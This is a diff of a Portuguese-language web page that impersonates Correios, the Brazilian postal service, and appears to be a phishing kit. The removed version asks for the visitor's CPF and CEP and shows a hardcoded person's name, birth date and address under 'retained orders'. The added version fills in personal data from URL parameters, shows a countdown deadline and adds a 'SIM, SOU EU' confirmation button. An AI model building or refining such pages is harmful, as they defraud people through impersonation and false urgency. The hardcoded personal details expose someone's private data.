@@ -1,182 +1,150 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
-
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
-  <title>Correios | Rastreio</title>
-  <link rel="stylesheet" href="css/bootstrap.css" />
-  <link rel="stylesheet" href="css/app.css" />
-  <link rel="stylesheet" href="css/yellow.css" />
-  <link rel="icon" type="image/x-icon" href="../wp-content/uploads/2024/11/regular_correios-logo-2.png" />
-  <script src="../scripts/utms/latest.js" async defer></script>
-
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Confirmação de Dados</title>
   <style>
-    @keyframes pulsar {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.05); }
-      100% { transform: scale(1); }
-    }
-
-    #consultar-btn {
-      animation: pulsar 1s infinite;
-    }
-
-    .spinner {
-      width: 50px;
-      height: 50px;
-      border: 4px solid rgba(0, 0, 0, 0.1);
-      border-top-color: #007bff;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin: 0 auto;
-    }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-
-    main {
-      max-width: 1000px;
-      margin: 2rem auto;
-      padding: 0 1rem;
-    }
-
-    #resultado {
-      background: #f8f9fa;
-      border-radius: 10px;
-      padding: 2rem;
+    body {
+      font-family: Arial, sans-serif;
+      background: #f7f9fc;
       color: #003157;
-      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-      display: none;
+      margin: 0;
+      padding: 20px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      text-align: center;
     }
-
-    #resultado h2 { color: #003157; }
-    #resultado p span { font-weight: bold; color: #007bff; }
+    .container {
+      background: white;
+      padding: 30px 40px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      max-width: 400px;
+      width: 100%;
+    }
+    h1 {
+      font-size: 22px;
+      margin-bottom: 20px;
+      color: #003157;
+    }
+    .info-item {
+      font-size: 16px;
+      margin: 8px 0;
+    }
+    .info-label {
+      font-weight: 600;
+      margin-right: 8px;
+    }
+    .info-value {
+      font-weight: 400;
+    }
+    .blank {
+      color: #bbb;
+      font-style: italic;
+    }
+    #prazo {
+      margin-top: 30px;
+      font-size: 18px;
+      font-weight: 700;
+      color: red;
+    }
+    #contador {
+      font-weight: 900;
+      font-size: 20px;
+      margin-top: 8px;
+    }
+    button#confirmar-btn {
+      margin-top: 40px;
+      padding: 12px 30px;
+      font-size: 18px;
+      font-weight: 700;
+      color: white;
+      background-color: #007bff;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      width: 100%;
+    }
+    button#confirmar-btn:hover {
+      background-color: #0056b3;
+    }
   </style>
 </head>
-
 <body>
-  <main>
-    <header>
-      <nav style="height:48px; background:#f0f0f0; display:flex; align-items:center; justify-content:center;">
-        <img src="images/correios.png" alt="Correios" height="25" />
-      </nav>
-    </header>
 
-    <!-- Tela Formulário -->
-    <section id="tela-formulario" class="p-4">
-      <h5 class="text-center">📦 ACOMPANHE SUAS ENCOMENDAS</h5>
-      <form id="form-rastreamento">
-        <div class="form-group">
-          <label>Digite o CPF do comprador:</label>
-          <input type="text" id="cpf" name="cpf" class="form-control" placeholder="000.000.000-00" maxlength="14" required>
-        </div>
-        <div class="form-group">
-          <label>Informe o CEP:</label>
-          <input type="text" id="cep" name="cep" class="form-control" placeholder="00000-000" maxlength="9" required>
-        </div>
-        <div id="botao-container" class="text-center">
-          <button type="submit" id="consultar-btn" class="btn btn-primary">Consultar</button>
-        </div>
-        <div id="loading-container" style="display:none; text-align:center; margin-top:20px;">
-          <p>Consultando seus dados...</p>
-          <div class="spinner"></div>
-        </div>
-      </form>
-    </section>
+<div class="container">
+  <h1>Encontramos pedidos retidos em uma de nossas agências. 📦</h1>
 
-    <!-- Tela Resultado -->
-    <section id="resultado">
-      <h2>Pedidos Retidos 📦</h2>
-      <p><span>Nome:</span> <span id="res-nome"></span></p>
-      <p><span>CPF:</span> <span id="res-cpf"></span></p>
-      <p><span>Nascimento:</span> <span id="res-nascimento"></span></p>
-      <p><span>CEP:</span> <span id="res-cep"></span></p>
-      <p><span>Rua:</span> <span id="res-rua"></span></p>
-      <p><span>Bairro:</span> <span id="res-bairro"></span></p>
-      <p><span>Cidade:</span> <span id="res-cidade"></span></p>
-      <p><span>Estado:</span> <span id="res-estado"></span></p>
-      <p><span>Prazo para Regularização:</span> <span id="res-prazo"></span></p>
-    </section>
+  <div class="info-item"><span class="info-label">Nome:</span><span id="nome" class="info-value">---</span></div>
+  <div class="info-item"><span class="info-label">CPF:</span><span id="cpf" class="info-value">---</span></div>
+  <div class="info-item"><span class="info-label">Nascimento:</span><span id="nascimento" class="info-value">---</span></div>
+  <div class="info-item"><span class="info-label">CEP:</span><span id="cep" class="info-value">---</span></div>
+  <div class="info-item"><span class="info-label">Rua:</span><span id="rua" class="info-value blank">&nbsp;</span></div>
+  <div class="info-item"><span class="info-label">Bairro:</span><span id="bairro" class="info-value blank">&nbsp;</span></div>
+  <div class="info-item"><span class="info-label">Cidade:</span><span id="cidade" class="info-value">---</span></div>
+  <div class="info-item"><span class="info-label">Estado:</span><span id="estado" class="info-value">---</span></div>
 
-    <section class="my-4">
-      <img src="images/banner-1.jpg" alt="Banner" class="w-100">
-    </section>
-  </main>
+  <div id="prazo">
+    Prazo para Regularização: <br />
+    <span id="contador">26/06/2025 às 23:59</span>
+  </div>
 
-  <script>
-    function formatarCPF(cpf) {
-      return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+  <button id="confirmar-btn">SIM, SOU EU</button>
+</div>
+
+<script>
+  // Função para preencher os dados da URL
+  function preencherDados() {
+    const params = new URLSearchParams(window.location.search);
+    // Preenche os campos ou usa valores padrão se vazio
+    document.getElementById('nome').textContent = params.get('nome') || '---';
+    document.getElementById('cpf').textContent = params.get('cpf') || '---';
+    document.getElementById('nascimento').textContent = params.get('nascimento') || '---';
+    document.getElementById('cep').textContent = params.get('cep') || '---';
+    // Rua e Bairro sempre em branco (com estilo blank)
+    document.getElementById('rua').textContent = '\u00A0'; // espaço não quebrável
+    document.getElementById('bairro').textContent = '\u00A0';
+    document.getElementById('cidade').textContent = params.get('cidade') || '---';
+    document.getElementById('estado').textContent = params.get('estado') || '---';
+  }
+
+  preencherDados();
+
+  // Configura a contagem regressiva
+  const prazoData = new Date('2025-06-26T23:59:00');
+  const contadorEl = document.getElementById('contador');
+
+  function atualizarContador() {
+    const agora = new Date();
+    const diff = prazoData - agora;
+
+    if (diff <= 0) {
+      contadorEl.textContent = "Prazo expirado!";
+      clearInterval(interval);
+      return;
     }
 
-    function formatarCEP(cep) {
-      return cep.replace(/(\d{5})(\d{3})/, "$1-$2");
-    }
+    const dias = Math.floor(diff / (1000 * 60 * 60 * 24));
+    const horas = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+    const minutos = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+    const segundos = Math.floor((diff % (1000 * 60)) / 1000);
 
-    function formatarPrazo(dataBase, dias, horas, minutos) {
-      const prazo = new Date(dataBase);
-      prazo.setDate(prazo.getDate() + dias);
-      prazo.setHours(horas);
-      prazo.setMinutes(minutos);
-      prazo.setSeconds(0);
-      const dd = String(prazo.getDate()).padStart(2, '0');
-      const mm = String(prazo.getMonth() + 1).padStart(2, '0');
-      const yyyy = prazo.getFullYear();
-      const hh = String(prazo.getHours()).padStart(2, '0');
-      const min = String(prazo.getMinutes()).padStart(2, '0');
-      return `${dd}/${mm}/${yyyy} às ${hh}:${min}`;
-    }
+    contadorEl.textContent = `${dias}d ${horas.toString().padStart(2,'0')}h ${minutos.toString().padStart(2,'0')}m ${segundos.toString().padStart(2,'0')}s`;
+  }
 
-    document.getElementById('form-rastreamento').addEventListener('submit', async function (event) {
-      event.preventDefault();
+  atualizarContador();
+  const interval = setInterval(atualizarContador, 1000);
 
-      const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
-      const cep = document.getElementById('cep').value.replace(/\D/g, '');
+  // Botão "SIM, SOU EU"
+  document.getElementById('confirmar-btn').addEventListener('click', () => {
+    alert('Obrigado por confirmar!');
+    // Aqui pode redirecionar ou enviar dados, conforme sua necessidade
+  });
+</script>
 
-      if (!cpf || cpf.length !== 11) {
-        alert('Por favor, insira um CPF válido.');
-        return;
-      }
-
-      if (!cep || cep.length !== 8) {
-        alert('Por favor, insira um CEP válido.');
-        return;
-      }
-
-      document.getElementById('botao-container').style.display = 'none';
-      document.getElementById('loading-container').style.display = 'block';
-
-      await new Promise(resolve => setTimeout(resolve, 2000)); // Simulando consulta
-
-      const dados = {
-        nome: "Rosiane Oliveira Da Silva",
-        cpf: formatarCPF(cpf),
-        nascimento: "27/01/1985",
-        cep: formatarCEP(cep),
-        rua: "Rua das Acácias",
-        bairro: "Centro",
-        cidade: "Porciúncula",
-        estado: "RJ",
-        prazoRegularizacao: formatarPrazo(new Date(), 10, 23, 59)
-      };
-
-      document.getElementById('res-nome').textContent = dados.nome;
-      document.getElementById('res-cpf').textContent = dados.cpf;
-      document.getElementById('res-nascimento').textContent = dados.nascimento;
-      document.getElementById('res-cep').textContent = dados.cep;
-      document.getElementById('res-rua').textContent = dados.rua;
-      document.getElementById('res-bairro').textContent = dados.bairro;
-      document.getElementById('res-cidade').textContent = dados.cidade;
-      document.getElementById('res-estado').textContent = dados.estado;
-      document.getElementById('res-prazo').textContent = dados.prazoRegularizacao;
-
-      document.getElementById('loading-container').style.display = 'none';
-      document.getElementById('tela-formulario').style.display = 'none';
-      document.getElementById('resultado').style.display = 'block';
-    });
-  </script>
 </body>
-
 </html>
